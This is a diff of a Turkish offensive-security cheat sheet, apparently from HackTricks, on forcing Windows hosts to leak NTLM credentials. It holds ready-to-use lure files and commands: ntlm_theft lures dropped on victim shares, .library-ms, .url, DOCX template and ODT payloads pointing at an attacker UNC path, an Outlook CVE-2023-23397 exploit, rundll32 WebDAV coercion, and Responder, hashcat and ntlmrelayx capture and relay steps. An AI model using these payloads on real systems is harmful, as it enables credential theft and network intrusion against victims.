@@ -1,14 +1,14 @@
-# NTLM kimlik bilgilerini çalınabilecek yerler
+# NTLM kimlik bilgilerini çalabileceğiniz yerler
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Microsoft Word dosyasını çevrimiçi indirmekten NTLM leak kaynaklarına kadar harika fikirlerin tümünü inceleyin: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ ve https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md; ayrıca https://github.com/p0dalirius/windows-coerced-authentication-methods**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)'teki tüm harika fikirleri inceleyin: çevrimiçi bir Microsoft Word dosyasını indirmekten NTLM leak kaynaklarına kadar: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-### Yazılabilir SMB paylaşımı + Explorer tarafından tetiklenen UNC tuzakları (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
+### Yazılabilir SMB paylaşımı + Explorer tarafından tetiklenen UNC lure'ları (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
 
-**Kullanıcıların veya zamanlanmış görevlerin Explorer'da gezindiği bir paylaşıma yazabiliyorsanız**, meta verileri sizin UNC yolunuza (ör. `\\ATTACKER\share`) işaret eden dosyalar bırakın. Klasörün görüntülenmesi **örtük SMB kimlik doğrulamasını** tetikler ve dinleyicinize bir **NetNTLMv2** sızdırır.<sup>[[1]](#references)</sup>
+**Kullanıcıların veya zamanlanmış işlerin Explorer'da gezindiği bir paylaşıma yazabiliyorsanız**, metadata'sı sizin UNC'nizi (ör. `\\ATTACKER\share`) gösteren dosyalar bırakın. Klasörün görüntülenmesi **örtük SMB kimlik doğrulamasını** tetikler ve listener'ınıza bir **NetNTLMv2** sızdırır.<sup>[[1]](#references)</sup>
 
-1. **Tuzaklar oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF vb. kapsar)
+1. **Lure'lar oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF vb. kapsar)
 
 ```bash
 git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
@@ -16,7 +16,7 @@ uv add --script ntlm_theft.py xlsxwriter
 uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
 ```
 
-2. **Yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):
+2. **Bunları yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasöre):
 
 ```bash
 smbclient //victim/share -U 'guest%'
@@ -25,18 +25,18 @@ prompt off
 mput lure/*
 ```
 
-3. **Dinle ve crackle**:
+3. **Dinle ve crack et**:
 
 ```bash
 sudo responder -I <iface>          # capture NetNTLMv2
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
 ```
 
-Windows aynı anda birkaç dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) tıklama gerektirmez.
+Windows aynı anda birkaç dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) için tıklama gerekmez.
 
 ### Windows Media Player çalma listeleri (.ASX/.WAX)
 
-Hedefin denetiminizdeki bir Windows Media Player çalma listesini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC path'e yönlendirerek Net-NTLMv2 sızdırabilirsiniz. WMP, başvurulan medyayı SMB üzerinden almaya çalışır ve otomatik olarak kimlik doğrulaması yapar.<sup>[[3]](#references)[[4]](#references)</sup>
+Hedefe sizin kontrol ettiğiniz bir Windows Media Player çalma listesini açtırabilir veya önizletebilirseniz, girdiyi bir UNC path'e yönlendirerek Net-NTLMv2 leak edebilirsiniz. WMP, başvurulan medyayı SMB üzerinden almaya çalışır ve örtük biçimde kimlik doğrulaması yapar.<sup>[[3]](#references)[[4]](#references)</sup>
 
 Örnek payload:
 
@@ -62,9 +62,9 @@ hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 ### ZIP içine gömülü .library-ms NTLM leak (CVE-2025-24071/24055)
 
-Windows Explorer, ZIP arşivinin içinden doğrudan açıldıklarında .library-ms dosyalarını güvenli olmayan şekilde işler. Library tanımı uzak bir UNC path'e (ör. \\attacker\share) işaret ediyorsa, ZIP içindeki .library-ms dosyasına göz atmak/açmak Explorer'ın UNC'yi listelemesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Böylece çevrimdışı olarak kırılabilen veya potansiyel olarak relay edilebilen bir NetNTLMv2 elde edilir.<sup>[[2]](#references)</sup>
+Windows Explorer, .library-ms dosyaları doğrudan bir ZIP arşivi içinden açıldığında bunları güvenli olmayan şekilde işler. Library tanımı uzak bir UNC yolunu (ör. \\attacker\share) gösteriyorsa, ZIP içindeki .library-ms dosyasına göz atmak/onu başlatmak Explorer'ın UNC yolunu taramasına ve saldırgana NTLM kimlik doğrulama bilgilerini göndermesine neden olur. Böylece çevrimdışı kırılabilen veya potansiyel olarak relay edilebilen bir NetNTLMv2 elde edilir.<sup>[[2]](#references)</sup>
 
-Saldırganın UNC path'ine işaret eden minimal .library-ms dosyası
+Saldırganın UNC yolunu gösteren minimal .library-ms
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -86,15 +86,15 @@ Saldırganın UNC path'ine işaret eden minimal .library-ms dosyası
 </libraryDescription>
 ```
 
-İşlemsel adımlar
-- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname değerinizi girin).
-- Dosyayı ZIP’leyin (Windows’ta: Gönder → Sıkıştırılmış (ziplenmiş) klasör) ve ZIP’i hedefe iletin.
-- Bir NTLM capture listener çalıştırın ve kurbanın ZIP’in içinden .library-ms dosyasını açmasını bekleyin.
+Operasyonel adımlar
+- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname değerinizi ayarlayın).
+- Dosyayı ZIP olarak sıkıştırın (Windows’ta: Gönder → Sıkıştırılmış (ziplenmiş) klasör) ve ZIP’i hedefe iletin.
+- NTLM capture listener çalıştırın ve kurbanın ZIP içindeki .library-ms dosyasını açmasını bekleyin.
 
 
-### Outlook takvim hatırlatıcısı ses yolu (CVE-2023-23397) – sıfır tıklamayla Net-NTLMv2 leak
+### Outlook takvim hatırlatıcısı ses yolu (CVE-2023-23397) – zero-click Net-NTLMv2 leak
 
-Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işliyordu. Bu özellik bir UNC yolunu (ör. \\attacker\share\alert.wav) gösteriyorsa Outlook, hatırlatıcı tetiklendiğinde SMB paylaşımına bağlanarak kullanıcının Net-NTLMv2 değerini hiçbir tıklama olmadan leak ediyordu. Bu açık 14 Mart 2023'te yamalandı, ancak eski/güncellenmemiş filolar ve geçmişe dönük olay müdahalesi için hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>
+Windows için Microsoft Outlook, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter’ı işliyordu. Bu özellik bir UNC yolunu (ör. \\attacker\share\alert.wav) gösteriyorsa, hatırlatıcı tetiklendiğinde Outlook SMB paylaşımıyla iletişim kurarak kullanıcının Net-NTLMv2’sini herhangi bir tıklama olmadan leak ediyordu. Bu sorun 14 Mart 2023’te yamalandı, ancak eski/güncellenmemiş sistem filoları ve geçmişe dönük olay müdahalesi açısından hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>
 
 PowerShell ile hızlı exploitation (Outlook COM):
 
@@ -111,14 +111,14 @@ Listener tarafı:
 sudo responder -I eth0  # or impacket-smbserver to observe connections
 ```
 
-Notlar
-- Kurbanın yalnızca hatırlatıcı tetiklendiğinde Outlook for Windows çalıştırıyor olması gerekir.
-- leak, çevrimdışı cracking veya relay için uygun Net-NTLMv2 sağlar (pass-the-hash değil).
+Notes
+- Mağdurun yalnızca hatırlatıcı tetiklendiğinde Outlook for Windows'u çalıştırıyor olması gerekir.
+- leak, çevrimdışı kırma veya relay için uygun Net‑NTLMv2 verir (pass-the-hash değil).
 
 
-### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 bypass)
+### .LNK/.URL simge tabanlı zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 bypass)
 
-Windows Explorer kısayol simgelerini otomatik olarak görüntüler. Son araştırmalar, Microsoft’un UNC simgeli kısayollar için Nisan 2025’te yayımladığı yamadan sonra bile kısayol hedefi UNC path üzerinde barındırılıp simge yerel tutulduğunda, tıklama olmadan NTLM authentication tetiklenebildiğini gösterdi (yama atlatma CVE‑2025‑50154 olarak atandı). Klasörü yalnızca görüntülemek, Explorer’ın uzak hedeften metadata almasına ve saldırganın SMB server’ına NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>
+Windows Explorer, kısayol simgelerini otomatik olarak görüntüler. Yakın tarihli araştırmalar, Microsoft'un UNC simgeli kısayollar için Nisan 2025'te yayımladığı yamadan sonra bile, kısayol hedefi bir UNC path'te barındırılıp simge yerel tutulduğunda tıklama gerektirmeden NTLM kimlik doğrulamasını tetiklemenin hâlâ mümkün olduğunu gösterdi (yama bypass'ına CVE‑2025‑50154 atandı). Klasörü görüntülemek bile Explorer'ın uzak hedeften metadata almasına ve saldırganın SMB sunucusuna NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>
 
 Minimal Internet Shortcut payload (.url):
 
@@ -141,70 +141,78 @@ $sc.Save()
 ```
 
 Delivery fikirleri
-- Kısayolu bir ZIP dosyasına koyun ve kurbanın dosyaya göz atmasını sağlayın.
+- Kısayolu bir ZIP dosyasına koyup kurbanın dosyaya göz atmasını sağlayın.
 - Kısayolu, kurbanın açacağı yazılabilir bir paylaşıma yerleştirin.
-- Explorer öğeleri önizleyebilsin diye aynı klasöre başka yem dosyaları da ekleyin.
+- Explorer öğeleri önizlesin diye aynı klasöre başka yem dosyaları da koyun.
 
-### Tıklama gerektirmeyen .LNK NTLM leak'i: ExtraData simge yolu (CVE‑2026‑25185)
+### ExtraData simge yolu üzerinden tıklama gerektirmeyen .LNK NTLM leak’i (CVE‑2026‑25185)
 
-Windows, `.lnk` meta verilerini yalnızca çalıştırma sırasında değil, **görünüm/önizleme** sırasında da yükler (simgeyi oluştururken). CVE‑2026‑25185, **ExtraData** bloklarının kabuğun bir simge yolunu çözümlemesine ve yükleme **sırasında** dosya sistemine erişmesine neden olduğu bir ayrıştırma yolunu gösteriyor. Yol uzak bir konumdaysa bu işlem giden NTLM trafiği oluşturuyor.
+Windows, `.lnk` meta verilerini yalnızca çalıştırma sırasında değil, **görünüm/önizleme** (simgeyi oluşturma) sırasında da yükler. CVE‑2026‑25185, **ExtraData** bloklarının kabuğun bir simge yolunu çözümlemesine ve dosya sistemine **yükleme sırasında** erişmesine neden olduğu bir ayrıştırma yolunu gösteriyor. Yol uzaksa bu işlem giden NTLM kimlik doğrulamasına yol açıyor.
 
-Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlendi):
-- ExtraData içine **DARWIN_PROPS** (`0xa0000006`) ekleyin (simge güncelleme yordamına geçiş koşulu).
-- **TargetUnicode** alanı doldurulmuş **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin.
-- Yükleyici, `TargetUnicode` içindeki ortam değişkenlerini genişletir ve ortaya çıkan yol için `PathFileExistsW` çağrısı yapar.
+Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlenmiştir):
+- ExtraData içine **DARWIN_PROPS** (`0xa0000006`) ekleyin (simge güncelleme yordamını etkinleştirir).
+- **TargetUnicode** alanı doldurulmuş bir **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin.
+- Yükleyici, `TargetUnicode` içindeki ortam değişkenlerini genişletir ve ortaya çıkan yol üzerinde `PathFileExistsW` çağrısı yapar.
 
-`TargetUnicode` bir UNC yoluna çözülürse (ör. `\\attacker\share\icon.ico`), kısayolun bulunduğu klasörü **yalnızca görüntülemek** bile giden kimlik doğrulamasına neden olur. Aynı yükleme yolu **dizin oluşturma** ve **AV taraması** sırasında da tetiklenebilir; bu da burayı pratik bir tıklama gerektirmeyen leak yüzeyi hâline getirir.<sup>[[7]](#references)</sup>
+`TargetUnicode` bir UNC yoluna çözülürse (ör. `\\attacker\share\icon.ico`), kısayolu içeren bir klasörü **yalnızca görüntülemek** bile giden kimlik doğrulamasını tetikler. Aynı yükleme yolu **dizin oluşturma** ve **AV taraması** sırasında da tetiklenebilir; bu da yöntemi tıklama gerektirmeyen pratik bir leak yüzeyi hâline getirir.<sup>[[7]](#references)</sup>
 
-Bu yapıları Windows GUI kullanmadan oluşturmak/incelemek için araştırma araçları (ayrıştırıcı/oluşturucu/UI), **LnkMeMaybe** projesinde bulunabilir.<sup>[[8]](#references)</sup>
+Bu yapıları Windows GUI’sini kullanmadan oluşturmak/incelemek için araştırma araçları (ayrıştırıcı/üretici/arayüz) **LnkMeMaybe** projesinde mevcuttur.<sup>[[8]](#references)</sup>
 
 
-### `davclnt.dll,DavSetCookie` ile WebDAV kimlik doğrulamasını zorlama / kimlik bilgisi doğrulama
+### `davclnt.dll,DavSetCookie` üzerinden WebDAV kimlik doğrulamasını zorlama / kimlik bilgilerini doğrulama
 
-Yerleşik **WebDAV client**, geçerli oturum açma oturumunu rastgele bir **HTTP/WebDAV** uç noktasına kimlik doğrulamaya zorlamak için kötüye kullanılabilir:
+Yerel **WebDAV istemcisi**, geçerli oturum açma oturumunu rastgele bir **HTTP/WebDAV** uç noktasına kimlik doğrulaması yapmaya zorlamak için kötüye kullanılabilir:
 
 ```cmd
 rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
 ```
 
 Neden kullanışlı:
-- **Saldırganın kontrolündeki bir WebDAV sunucusuna** karşı, özel bir istemci yüklemeden **HTTP üzerinden NTLM** tetikleyebilir.
-- **İç ağdaki hostlara** karşı, yatay hareket etmeden önce çalınan kimlik bilgilerinin nerelerde kabul edildiğini **sessizce doğrulamanın** bir yoludur.<sup>[[9]](#references)</sup>
-- **SMB çıkışı filtrelenmiş**, ancak **HTTP/WebDAV** erişilebilir durumdaysa bu komut iyi bir alternatiftir.
+- **Saldırganın kontrolündeki bir WebDAV sunucusuna** karşı, özel bir istemci bırakmadan **HTTP üzerinden NTLM** tetikleyebilir.
+- **Dahili ana makinelere** karşı, yanal hareket etmeden önce çalınan kimlik bilgilerinin nerelerde kabul edildiğini **doğrulamanın** sessiz bir yoludur.<sup>[[9]](#references)</sup>
+- **SMB çıkış trafiği filtrelenmiş**, ancak **HTTP/WebDAV** erişilebilir durumdaysa bu komut iyi bir alternatiftir.
 
 Operasyonel notlar:
-- Kaynak hostta **WebClient** hizmeti çalışıyor olmalıdır.
-- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un WebDAV kimlik doğrulamasını **geçerli kullanıcının kimlik bilgileriyle** gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
-- Komutu kontrol ettiğiniz bir altyapıya yönlendiriyorsanız şu gibi NTLM destekli bir HTTP listener/relay kullanın:
+- Kaynak ana makinede **WebClient** hizmeti çalışıyor olmalıdır.
+- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un WebDAV kimlik doğrulamasını **mevcut kullanıcının kimlik bilgileriyle** gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
+- Komutu kontrolünüzdeki altyapıya yönlendiriyorsanız, aşağıdaki gibi NTLM destekli bir HTTP listener/relay kullanın:
 
 ```bash
 # Capture or relay NTLM over HTTP/WebDAV
 ntlmrelayx.py -t smb://<TARGET> --http-port 80
 ```
 
-Tespit açısından, çok sayıda iç sisteme karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **kimlik bilgisi doğrulama / spray benzeri yanal hareket hazırlığı** için güçlü bir göstergedir.<sup>[[9]](#references)[[11]](#references)</sup>
+Tespit açısından, birçok iç sisteme karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **kimlik bilgisi doğrulama / spray benzeri yanal hareket hazırlığı** için güçlü bir göstergedir.<sup>[[9]](#references)[[11]](#references)</sup>
 
 ### Office remote template injection (.docx/.dotm) ile NTLM'i zorlamak
 
-Office belgeleri harici bir şablona başvurabilir. Ekli şablonu bir UNC yoluna ayarlarsanız belge açıldığında SMB üzerinden kimlik doğrulaması yapılır.
+Office belgeleri harici bir şablona başvurabilir. Ekli şablonu bir UNC yolu olarak ayarlarsanız, belge açıldığında SMB üzerinden kimlik doğrulaması yapılır.
 
-DOCX ilişkisinde yapılacak en basit değişiklikler (word/ içinde):
+Asgari DOCX ilişki değişiklikleri (word/ içinde):
 
-1) word/settings.xml dosyasını düzenleyip ekli şablon başvurusunu ekleyin:
+1) word/settings.xml dosyasını düzenleyin ve ekli şablon başvurusunu ekleyin:
 
 ```xml
 <w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
 ```
 
-2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'yi UNC'nize yönlendirin:
+2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'yi UNC yolunuza yönlendirin:
 
 ```xml
 <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
 ```
 
-3) .docx olarak yeniden paketleyip teslim edin. SMB capture listener'ınızı çalıştırın ve dosyanın açılmasını bekleyin.
+3) Yeniden .docx olarak paketleyip teslim edin. SMB capture listener'ınızı çalıştırın ve dosyanın açılmasını bekleyin.
 
-NTLM'i relay etme veya kötüye kullanma sonrası fikirler için şunlara göz atın:
+### SMB kimlik doğrulaması için ODT harici nesnesi
+
+Belge yükleme yolu `.odt` dosyalarını kabul ediyor ancak hedef Office `.docx` dosyalarını açmıyorsa, Office template yerine bir OpenDocument harici nesnesi kullanın. Metasploit'in `auxiliary/fileformat/odt_badodt` modülü, `content.xml` dosyasında aşağıdaki gibi yükleme sırasında çalışan bir `draw:object` başvurusu içeren bir ODT oluşturur. `LHOST` değerini SMB listener olarak ayarlayın, ODT'yi izin verilen iş akışı üzerinden yükleyin ve bir kullanıcı veya belge işlemcisi dosyayı açtığında giden NetNTLMv2 yanıtını yakalayın. Dosya adı uzantısı denetimi bu gömülü URL'yi incelemez; hedefteki gelen NTLM kısıtlamaları giden kimlik doğrulamayı mutlaka engellemez.<sup>[[15]](#references)</sup>
+
+```xml
+<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
+```
+
+NTLM'i relay etme veya kötüye kullanmaya yönelik capture sonrası fikirler için bkz.:
 
 {{#ref}}
 README.md
@@ -212,20 +220,18 @@ README.md
 
 
 ## References
-- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
-- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
-- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
-- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
-- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
-- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
-- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
-- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
-- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
-- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
+- [1] [HTB: Breach – Yazılabilir paylaşım tuzakları + Responder capture → NetNTLMv2 crack → svc_mssql Kerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → DA için AD CS ESC16 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
+- [3] [HTB: Media — WMP NTLM leak → webroot'a NTFS junction ile RCE → FullPowers + GodPotato ile SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [4] [Morphisec – 5 NTLM güvenlik açığı: Microsoft'ta yamalanmamış ayrıcalık yükseltme tehditleri](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
+- [5] [MSRC – Microsoft, Outlook EoP'yi (CVE‑2023‑23397) gideriyor ve PidLidReminderFileParameter üzerinden NTLM leak'i açıklıyor](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
+- [6] [Cymulate – Zero-click, tek NTLM: Microsoft güvenlik yaması bypass'ı (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
+- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 incelemesi](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
+- [8] [TrustedSec LnkMeMaybe araçları](https://github.com/trustedsec/LnkMeMaybe)
+- [9] [Rapid7 – BT desteği aradığında: Teams'ten etki alanının ele geçirilmesine uzanan ModeloRAT kampanyasının incelenmesi](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
+- [10] [Microsoft Learn – davclnt.h başlık dosyası](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
+- [11] [Splunk – Windows Rundll32 WebDAV isteği](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
+- [12] [osandamalith.com - Netntlm hash'lerini çalmak için ilgi çekici yerler](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
 - [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
 - [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
-
-
-{{#include ../../banners/hacktricks-training.md}}
+- [15] [HTB: Hercules — ODT harici nesneyle NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
